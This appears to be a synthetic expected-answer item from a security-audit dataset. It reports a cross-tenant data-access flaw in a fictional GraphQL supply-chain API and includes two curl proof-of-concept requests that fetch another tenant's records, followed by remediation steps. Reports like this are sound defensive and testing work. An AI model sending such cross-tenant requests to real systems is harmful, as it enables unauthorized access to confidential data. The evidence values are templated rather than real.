# Expected Response

## System
- Domain: Food & Beverage / Supply Chain Traceability
- System: TraceOrigin Supply API
- Example ID: GQL-0079

## Priority Findings

### Finding 1: Semantic Ambiguity — Over-Broad Bulk Endpoint Enables Cross-Tenant Supply Chain Data Access (Pattern 3.3)
**Severity:** High
**Category:** Insecure Design / Semantic Ambiguity

**Summary:**
Per §5.0 (Pattern 3.3 — semantic ambiguity/over-broad endpoints): The `bulkResourceLookup` mutation is semantically ambiguous — its name implies a user's own resource lookup, but it accepts arbitrary IDs with no ownership boundary. An attacker from `tenant-4693` retrieved food supply chain traceability records (`R-2079`, `R-1079`, `R-3079`) belonging to `tenant-620b`. In food & beverage supply chain, this exposes ingredient sourcing, supplier relationships, and certification records that constitute confidential trade data.

**Evidence from HAR:**
- Request: `POST https://api.traceorigin-supply.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-4693`
- Mutation: `bulkResourceLookup(ids: ["R-2079", "R-1079", "R-3079"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-620b"`, `ownerId: "other-user-4693620b"`, `sensitiveField: "CONFIDENTIAL-4693620b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-4693620b`

## Steps to Reproduce

### Step 1 — Bulk supply chain record access (HAR)
```bash
curl -s -X POST https://api.traceorigin-supply.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4693" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2079\", \"R-1079\", \"R-3079\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-4693620b` from `tenant-620b`. **Secure:** FORBIDDEN.

### Step 2 — Over-broad endpoint via listResources
```bash
curl -s -X POST https://api.traceorigin-supply.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4693" \
  -d '{"query": "query { listResources(tenantId: \"tenant-620b\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Semantically ambiguous endpoint accepts victim tenantId.

## Remediation
1. Rename and scope `bulkResourceLookup` — enforce per-ID ownership filtering.
2. `listResources` must use JWT `tenantId` — discard client argument.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
